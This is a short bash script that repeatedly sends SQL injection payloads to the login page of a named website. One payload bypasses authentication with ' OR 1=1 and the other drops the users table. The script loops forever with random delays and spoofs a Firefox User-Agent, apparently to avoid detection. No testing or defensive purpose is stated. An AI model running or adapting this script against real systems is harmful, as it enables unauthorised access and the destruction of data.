version=$(( $RANDOM % 15 + 20 ))
getter=(curl -k -s -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:$version.0) Gecko/20100101 Firefox/$version.0" -H "sky.net")

while :; do
	sleep $(( $RANDOM % 30 + 2 ))s

	"${getter[@]}" "https://www.sky.net/login.php" -X POST -d "login=%27%20OR%201%3D1%3B%20--%20&password=any"

	sleep $(( $RANDOM % 30 + 2 ))s

	"${getter[@]}" "https://www.sky.net/login.php" -X POST -d "login=%27%3B%20DROP%20TABLE%20users%3B%20--%20&password=guess"
done
